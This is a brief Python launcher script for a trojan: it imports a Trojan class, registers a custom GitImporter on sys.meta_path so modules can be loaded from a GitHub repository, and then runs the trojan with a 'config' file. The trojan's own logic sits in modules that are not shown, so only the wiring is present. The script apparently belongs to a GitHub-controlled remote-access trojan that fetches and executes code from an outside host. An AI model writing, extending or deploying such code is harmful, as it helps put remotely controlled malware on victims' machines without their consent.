import sys
from modules.Trojan import Trojan
from modules.GitImporter import GitImporter
from modules.github_connection import github_connect, get_file_contents

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('config')
    trojan.run()